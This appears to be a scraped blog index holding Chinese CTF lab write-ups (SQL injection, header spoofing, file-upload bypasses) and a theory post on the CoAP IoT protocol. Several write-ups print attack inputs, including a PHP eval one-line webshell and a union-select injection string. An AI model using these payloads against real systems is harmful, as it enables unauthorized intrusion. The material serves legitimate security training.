4时无回显，可知列数为3。构造语句0'union/**/select/**/1,flag,3/**/from/**/flag#，成功回显。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:13:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x0D 第二十二周 | 想想怎么绕过过滤吧 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5022 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 页面与上一题相同，select大写绕过即可。 ","date":"2021-02-04","objectID":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/:14:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（9-22）","uri":"/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/"},{"categories":["WriteUp"],"content":"0x00 前言 好久没逛过合天了，进实验室van一van。 地址：https://www.hetianlab.com/cour.do?w=1\u0026c=CCID2d51-5e95-4c58-8fc9-13b1659c1356 ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x01 第一周 | 神奇的磁带 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5001 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 输入IP地址，进入页面。 在html底部发现一个./Flag.txt，输入url，点开解码Unicode后，出现： 抓包发现cookie值是base64编码。 decoder解码后得到q1234567890p..，作为密码输入，出现弹窗。 答案很明显是tape，又来了弹窗。 输入/Flag-Win.txt，得到提示。 直接btzhy，弹窗又来了。 好，给了个PHP的文件，感觉离flag又近了一步。 HTML里提示两位数，Intruder开始爆破10-99。在长度栏发现华点。 成功得到flag。Flag{ctf_victory_SecBug} ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:2:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x02 第二周 | 就差一把钥匙 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5002 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 打开后啥也妹有，html代码也没有任何信息。 使用Nikto扫描敏感目录，发现存在robots.txt。 发现隐藏目录。 进不去，更改X-Forwarded-For：127.0.0.1 成功得到flag。flag{hetianlab-weekctf} ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:3:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x03 第三周 | 迷了路 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5003 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 好的，开幕就是访问国外网站，猜测需要修改HTTP请求头的accept-language，抓个包尝试下。 多出了flag的部分信息，八个国家，应该尝试8次拼接就好。参考【WEB】语言代码缩写表大全（用于Accept-Language）（日语应该是jp而不是ja） 成功得到flag{Thisis_hetianlab@} ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:4:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x04 第四周 | Check your source code 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5004 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 根据题目信息，看看html源代码，发现source.txt。 从源代码可知，username需要输入admin，password不能为admin，需要设置一个名为check的cookie，难点在找到check的值。首先，根据ahash的值来推出secret为88。 构造ODg=%61%64%6d%69%6e%31，成功得到flag{welcome_to_htlab}。 ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:5:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x05 第五周 | Easy upload 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5005 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 题目已经明示了是文件上传类型的题目，看源码。 先随便传张图片。 抓包改filename为give_me_flag.php。 再插入givemeflag。 清清爽爽得到了flag{hetian@lab_com}。 ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:6:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x06 第六周 | 套娃一样的上传 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5006 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 先传一张图片。 需要修改文件类型，这里修改filename为1.php。 黑名单绕过，可以大小写绕过，例如Php、PhP或者利用黑名单中没有的，但是又能够被解析的后缀名，例如php、php3、php4、php5、php7、pht、phtml、phps。尝试phtml通过。 尝试把图片内容长度修改为17。 Get it。flag{0000_0000_0000} ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:7:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x07 第七周 | 再见上传 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5007 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 从题目得知，又是一道上传的题，老规矩，先传图片。 改filename，发现不管用了。 白名单校验，可以利用Apache的解析漏洞，Apache是从后面开始检查后缀，按最后一个合法后缀，在文件上传目录用%00截断，这里由于是POST方式，需要urldecode。 成功得到flag{asdf_hetianlab_com}。哪儿来的女朋友，我向往自由.jpg ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:8:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["WriteUp"],"content":"0x08 第八周 | 随意的上传 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Centos7 IP地址：10.1.1.147:5008 攻击机：Kali IP地址：随机分配 要求：获取目标flag 提示：flag格式为Flag{} 提示 随意到不提供工具？你打开C盘的tools看看呢~ 首先打开c盘的tools，发现三个文件。文件上传类型，一般与bp和菜刀有关，bp直接在桌面，没必要大费周章的提示，所以题目和菜刀有关，先写个一句话木马。 写了php木马但系统没有警告，看来题目的思路没错。 找到文件上传路径。 发现字符\u003c?php被过滤。 用这一段代码来代替。 \u003cscript language=\"pHp\"\u003e@eval($_POST['cmd'])\u003c/script\u003e\r成功进入。 找到flag.php，拿到flag{0123_4567_8901} ","date":"2021-02-03","objectID":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:9:0","tags":["Web安全","CTF"],"title":"合天网安Weekly系列（1-8）","uri":"/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":["学习"],"content":"\r","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:0:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x00 前言 最近在想毕业设计的选题，和老师讨论后，觉得可以在原来基于SDN架构的企业局域网流量监控和访问控制系统的基础之上再改进，老师提到《基于SDN的IoT设备细粒度访问控制研究与实现》的论文可以用来参考，来达到对请求动作的权限访问控制，经过一通学习，发现整个过程是通过物联网协议CoAP来判断的，遂开始了对CoAP的学习。 ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:1:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x01 啥叫CoAP? CoAP（Constrained Application Protocol）是一种在物联网世界的类web协议，它的详细规范定义在 RFC 7252。COAP名字翻译来就是“受限应用协议”，顾名思义，使用在资源受限的物联网设备上。物联网设备的ram，rom都通常非常小，运行TCP和HTTP是不可以接受的。CoAP是一个完整的二进制应用层协议，消息格式紧凑，默认运行在UDP上。 CoAP定义了4种消息类型：Confirmable, Non-confirmable, Acknowledgement, Reset，其中一些信息中包含的方式代码和响应码使得它们携带了请求和响应。我们可以把CoAP在逻辑上视作两层，CoAP的消息层用于处理UDP和异步性质的交互，请求和响应的交互则通过方式代码和响应码实现。然而，CoAP是一个单一协议，仅在CoAP头具有消息传递和请求/响应功能。 ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:2:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x02 CoAP协议消息类型 上文提到CoAP协议有4种消息类型，下面就进一步学习。 CON—— 需要被确认的请求，如果CON请求被发送，那么对方必须做出响应。这有点像TCP，对方必须给确认收到消息，用以可靠消息传输。 NON—— 不需要被确认的请求，如果NON请求被发送，那么对方不必做出回应。这适用于消息会重复频繁的发送，丢包不影响正常操作。这个和UDP很像。用以不可靠消息传输。 ACK —— 应答消息，对应的是CON消息的应答。 RST —— 复位消息，可靠传输时候接收的消息不认识或错误时，不能回ACK消息，必须回RST消息。 ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:3:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x03 CoAP消息格式 CoAP基于压缩消息的交换，默认情况下通过UDP协议传输。 (例如每个 CoAP消息占用了一个UDP的数据包的数据段) 。CoAP消息以简单的二进制格式编码，以 4字节的固定大小作为首部，后面是一个可变长度的令牌值，长度可以在0到8字节之间。令牌值之后是一系列类型长度值（TLV）格式的零个或多个CoAP选项，可选地携带占用其余数据报的有效负载。 消息头（HEAD） Ver : 2bit， 版本信息，当前是必须写0x01。 T： 2bit， 消息类型，包括 CON, NON. ACK, RST这4种。 TKL: 4bit，token长度， 当前支持0~8B长度，其他长度保留将来扩展用。CoAP协议中具有两种功能相似的标识符，一种为Message ID(报文编号)，一种为Token(标识符)。其中每个报文均包含消息编号，但是标识符对于报文来说是非必须的。 Code：8bit，分成前3bit（0~7）和后5bit（0~31），前3bit代表类型。 0代表空消息或者请求码， 2开头代表响应码，取值如下： 0.00 Indicates an Empty message 0.01-0.31 Indicates a request. 1.00-1.31 Reserved 2.00-5.31 Indicates a response. 6.00-7.31 Reserved Message ID：16bit， 代表消息MID，每个消息都有一个ID ，重发的消息MID不变 token（可选）标识符具体内容，通过TKL指定Token长度。 token值为0到8字节的序列。 ( 每条消息必须带有一个标记, 即使它的长度为零）。 每个请求都带有一个客户端生成的token, 服务器在任何结果响应中都必须对其进行回应。token类似消息ID，用以标记消息的唯一性。token还是消息安全性的一个设置，使用全8字节的随机数，使伪造的报文无法获得验证通过。 option（可选，0个或者多个）主要用于描述请求或者响应对应的各个属性，类似参数或者特征描述，比如是否用到代理服务器，目的主机的端口等。 payload（可选）实际携带数据内容， 若有， 前面加payload标识符“0xFF”，如果没有payload标识符，那么就代表这是一个0长度的payload。如果存在payload标识符但其后跟随的是0长度的payload，那么必须当作消息格式错误处理。 ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:4:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x04 CoAP的请求码和响应码 请求方法 【0.01】GET方法——用于获得某资源 【0.02】POST方法——用于创建某资源 【0.03】PUT方法——用于更新某资源 【0.04】DELETE方法——用于删除某资源 响应码 Success 2.xx，这一类型的状态码，代表请求已成功被服务器接收、理解、并接受。 2.01 Created 2.02 Deleted 2.03 Valid 2.04 Changed 2.05 Content Client Error 4.xx，这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。 4.00 Bad Request 4.01 Unauthorized 4.02 Bad Option 4.03 Forbidden 4.04 Not Found 4.05 Method Not Allowed 4.06 Not Acceptable 4.12 Precondition Failed 4.13 Request Entity Too Large 4.15 Unsupported Content-Format Server Error 5.xx，这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器的软硬件资源无法完成对请求的处理。 5.00 Internal Server Error 5.01 Not Implemented 5.02 Bad Gateway 5.03 Service Unavailable ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:5:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["学习"],"content":"0x05 参考文章 https://tools.ietf.org/html/rfc7252 https://www.jianshu.com/p/7fec0916a0d3 https://baijiahao.baidu.com/s?id=1609055547851599818\u0026wfr=spider\u0026for=pc ","date":"2021-02-03","objectID":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/:6:0","tags":["学术研究"],"title":"物联网协议CoAP学习（理论篇）","uri":"/2021-02-03-%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AEcoap%E5%AD%A6%E4%B9%A0%E7%90%86%E8%AE%BA%E7%AF%87/"},{"categories":["WriteUp"],"content":"\r","date":"2021-01-31","objectID":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/:0:0","tags":["CTF"],"title":"2021年“春秋杯”新年欢乐赛部分WriteUp","uri":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x00 签到题 万物皆有\"FUN\"，电脑扫\"FUN\"活动，提供大写的\"FUN\"字样，即可获取flag~ 下载压缩包后，解压打开新年快乐.exe，发现获取摄像头权限在截图，根据提示。在纸上写下“FUN”，放到摄像头前，出现flag.txt，打开获取flag。flag{ju5t_f0r_FUN} ","date":"2021-01-31","objectID":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/:1:0","tags":["CTF"],"title":"2021年“春秋杯”新年欢乐赛部分WriteUp","uri":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x01 十二宫的挑衅 解压后发现图片。 ^#@$@#()/\u003e@?==%1(\r!)\u003e(*+3\u003c#86@-7$^.\r4\u0026)8%#5\u00266!=%1#$-$\r+5\u0026?#!.03!%=@=101\r0?(*~#??.+)%\u0026.7^8\r=1%^=$5$7@@8\u003e\u0026*9\r9@0185(+7)\u003c%3#@^4\r\u0026@@\u003c.)$3*#%%\u003c\u003c*++\r.@.?=~**+!==65^@\u0026\r参考文章https://mp.weixin.qq.com/s/PG3tyhxEPuSjOo62g4iPDQ发现Z-340的解密方法 首先将文本按上述步骤处理，得到如下结果。 ^\u003e%..@3*\u0026\r#(#0+@#+.\r@*53)8@+@\r$+\u0026!%\u003e^\u0026.\r@36%\u0026\u00264@?\r#\u003c!=.*9@=\r(#=@79@\u003c~\r)8%=^=0.*\r/611811)*\r\u003e@#00%8$+\r@-$1?*53!\r?7-+(^(*=\r=$$5*=+#=\r=^4\u0026~$7%6\r%.\u0026?#5)%5\r1!)#?$\u003c\u003c^\r()8!?7%\u003c@\r文章里面提到了AZdecrypt解密工具，在https://drive.google.com/uc?id=1_lP82NAvj5-vzd8O33e5aggWViHd-THJ\u0026export=download下载后使用。 成功得到flag{WUUHUUTAKEOFF} ","date":"2021-01-31","objectID":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/:2:0","tags":["CTF"],"title":"2021年“春秋杯”新年欢乐赛部分WriteUp","uri":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x02 puzzle 下载后一张松鼠图片和一个压缩包，解压后1125张低像素的松鼠图片碎片，题目也提到了拼图的好处，猜测是需要拼图的。初步观察发现图片藏有模糊的flag信息，肉眼识别难度较大。 目测flag{w9w45my5x8kk4e8gp9nqm6j2wad49}，但答案无法通过。 将个别图片放到https://zh.pixfix.com/降噪处理，得到flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49} ","date":"2021-01-31","objectID":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/:3:0","tags":["CTF"],"title":"2021年“春秋杯”新年欢乐赛部分WriteUp","uri":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/"},{"categories":["WriteUp"],"content":"0x03 2019-nCoV hint：1. 增加hint.txt下载 2.可用python统计次数最多的字符； 解压发现 zip文件已加密，内部藏有信息。 使用 silenteye解码pass.wav，音频中的LSB（最低有效位）隐写，得到priebeijoarkjpxmdkucxwdus，尝试解密，错误。 打开hint.txt，内容如下： NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE====== 解码base32得到 http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html\rhttps://www.ncbi.nlm.nih.gov/orffinder/\rhttp://www.merrybio.com.cn/blog/coronavirus-introduction.html\rPlease notice The largest structural protein\rthe password is the md5(it's gene sequence) and do not let the ‘\\n’ in md5()\r刺突蛋白（Spike Protein，S）是病毒最大的结构蛋白，猜测密码应该是它的序列的md5值，序列子范围为21536-25384，需要在第二个页面输入登录号MN908947搜寻，得到如下结果。 MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDK\rVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVY\rFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFL\rGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLRE\rFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTL\rLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDC\rALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEV\rFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLC\rFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNL\rDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFP\rLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNF\rNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCS\rFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSN\rVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQS\rIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMY\rICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKT\rPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCL\rGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAG\rAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSST\rASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEV\rQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVD\rFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPR\rEGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPL\rQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAK\rNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCC\rSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT\rMd5加密得到98eb1b1760bcc837934c8695a1cee923，也解不开压缩包文件，怀疑可能是mp3加密，利用Mp3Stego解密。 打开cov.mp3.txt，得到2019-nCoV。解压打开hint2，得到一串16进制代码 796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154 转ASCII码 you must pay attention to N protein ,How do that get into the viral capsid?\u0026lt;br\u003edo you know steghide?\u0026lt;br\u003ethe password is encrypt by VigenÃ¨re Cipher\u0026lt;br\u003ethe screct key is The top 20 characters with the most occurrences are counted+COMBAT 提示给到了N蛋白、steghide、维吉尼亚密码和词频统计Top20+COMBAT，先解密下图片。 需要一个密码，应该和N蛋白的信息有关，N的序列范围为28274-29533，先统计解密了，但得不到结果，又在文章中看到病毒在进行装配时，N蛋白先和病毒RNA相互作用形成复合体形式，然后再结合M蛋白、E蛋白，最后被包装进入病毒衣壳内。这次加上M的序列范围为27202-27387，E的蛋白范围为26523-27191，得到： MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA\rSWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK\rMKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN\rPANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG\rSSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS\rAAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH\rWPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV\rILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL\rDDFSKQLQQSMSSADSTQA\rMFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS\rQLDEEQPMEID\rMADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK\rLIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF\rRLFART","date":"2021-01-31","objectID":"/2021-01-31-2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B%E9%83%A8%E5%88%86writeup/:4:0","tags":["CTF"],"title":"2021年“春秋杯”新年